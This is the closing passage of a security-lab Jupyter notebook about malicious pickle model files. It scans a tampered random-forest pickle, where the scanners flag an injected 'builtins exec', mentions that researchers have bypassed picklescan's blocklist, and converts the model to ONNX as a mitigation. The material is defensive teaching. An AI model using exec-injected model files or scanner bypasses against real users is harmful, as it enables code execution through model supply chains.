    "The tool we are using here is **picklescan**. While this tool provides a helpful first step, it is not a panacea. For example, researchers were able to bypass this tool, as it relied on a known blocklist: https://github.com/mmaitre314/picklescan/blob/main/src/picklescan/scanner.py#L88  . The bypass occurred using built in Python libraries and third party libraries such as Pandas. \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "453cae98",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/r_forest_legit.pkl: dangerous import 'builtins exec' FOUND\n",
      "----------- SCAN SUMMARY -----------\n",
      "Scanned files: 1\n",
      "Infected files: 1\n",
      "Dangerous globals: 1\n"
     ]
    }
   ],
   "source": [
    "# https://github.com/mmaitre314/picklescan\n",
    "# Picklescan\n",
    "\n",
    "# We can see below the pickle is reporting that builtins exec was found\n",
    "# If we remember, above, we did use exec command.\n",
    "\n",
    "!picklescan --path  /tmp/r_forest_legit.pkl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "489b115c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ScanResult(globals=[Global(module='numpy', name='dtype', safety=<SafetyLevel.Innocuous: 'innocuous'>), Global(module='sklearn.tree._classes', name='DecisionTreeClassifier', safety=<SafetyLevel.Suspicious: 'suspicious'>), Global(module='numpy._core.multiarray', name='scalar', safety=<SafetyLevel.Suspicious: 'suspicious'>), Global(module='numpy', name='ndarray', safety=<SafetyLevel.Innocuous: 'innocuous'>), Global(module='sklearn.ensemble._forest', name='RandomForestClassifier', safety=<SafetyLevel.Suspicious: 'suspicious'>), Global(module='builtins', name='exec', safety=<SafetyLevel.Dangerous: 'dangerous'>), Global(module='numpy._core.multiarray', name='_reconstruct', safety=<SafetyLevel.Innocuous: 'innocuous'>), Global(module='sklearn.tree._tree', name='Tree', safety=<SafetyLevel.Suspicious: 'suspicious'>)], scanned_files=1, issues_count=1, infected_files=1, scan_err=False)\n"
     ]
    }
   ],
   "source": [
    "print(pk_scanner.scan_file_path(path=f'{r_forest_path}'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "43dc68b6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/bin/bash: line 1: modelscan: command not found\n"
     ]
    }
   ],
   "source": [
    "# Generally we don't wish to use only one tool. \n",
    "# Let's introduce modelscan from TrustedAI\n",
    "# https://github.com/protectai/modelscan\n",
    "# We see below that it is reporting one critical issue and \n",
    "# we also see the note about **exec**\n",
    "!modelscan -p  {r_forest_path}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "ebaff97d",
   "metadata": {},
   "outputs": [],
   "source": [
    "# We can also disassemble the pickle file\n",
    "# Just as we did earlier above\n",
    "# This can take a while so either uncomment it or prepare to interrupt\n",
    "#!fickling --trace /tmp/r_forest_legit.pkl"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "417f158e",
   "metadata": {},
   "source": [
    "### Step 6:   \n",
    "\n",
    "We know now what we should do to ensure any models we download from the internet is somewhat trusted.   \n",
    "Rather than saving the file as pickel, let's switch the file format to the Open Neural Network Exchange (ONNX) format: You can learn more about ONNX here:  https://onnx.ai/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "a5d9a250",
   "metadata": {},
   "outputs": [],
   "source": [
    "# There we go. We will able to compromise the model using the fickling technique \n",
    "# How do we mitigate this\n",
    "# Let's save the model as a SafeTensor instead of using the Pickle format\n",
    "# https://huggingface.co/docs/safetensors/api/numpy\n",
    "# https://scikit-learn.org/stable/model_persistence.html\n",
    "\n",
    "\n",
    "# Safe Tensors does not seem to be a fit here for persistence\n",
    "# Problem here is the original model format is lost\n",
    "from skl2onnx import to_onnx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "cf396441",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/r_forest.onnx\n"
     ]
    }
   ],
   "source": [
    "# Convert the r_forest classifier to onnx format\n",
    "r_forest_onnx = to_onnx(model=r_forest, X=X, name='r_forest_secured_model')\n",
    "\n",
    "r_forest_onnx_path = r'/tmp/r_forest.onnx'\n",
    "# Save the file\n",
    "with open(file=r_forest_onnx_path, mode='wb') as fp:\n",
    "    fp.write(r_forest_onnx.SerializeToString())\n",
    "\n",
    "# Confirm the file\n",
    "!ls {r_forest_onnx_path}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "8ade18a0",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Load the model\n",
    "# Keep in mind the original model format is lost\n",
    "from onnxruntime import InferenceSession"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "b1fdf776",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([0], dtype=int64)"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# This is currently considered the most secure option for storing scikit-learn models\n",
    "# However, based on research done by HiddenLayer, you may still be able to run arbitrary code in ONNX model format\n",
    "# See this link: https://hiddenlayer.com/innovation-hub/weaponizing-machine-learning-models-with-ransomware/\n",
    "# The training and serving environments are independent of each other\n",
    "\n",
    "# Unfortunately, not all scikit-learn models are currently supported\n",
    "# Most importantly, the original Python object is loaded and \n",
    "# cannot be reconstructed\n",
    "\n",
    "with open(file=r_forest_onnx_path, mode='rb') as fp:\n",
    "    loaded_r_forest_onnx = fp.read()\n",
    "\n",
    "r_forest_inference_sess = InferenceSession(path_or_bytes=loaded_r_forest_onnx, providers=[\"CPUExecutionProvider\"])\n",
    "\n",
    "# Make a prediction on a sample\n",
    "# Below we see the class as well as the confidence for each class\n",
    "r_forest_inference_sess.run(None, {'X' : [[5,3,2,1]]})[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "24e3481e",
   "metadata": {},
   "source": [
    "### Lab Takeaways:   \n",
    "- We learnt about the pickle format \n",
    "- We saw how arbritary code can be written to the model file   \n",
    "- We learnt about the ONNX format   \n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "76ccd674",
   "metadata": {},
   "source": [
    "### Additional References:   \n",
    "- https://blog.trailofbits.com/2024/03/04/relishing-new-fickling-features-for-securing-ml-systems/     \n",
    "- https://peps.python.org/pep-3154/   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a0e5028d",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "adversarial_ai",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
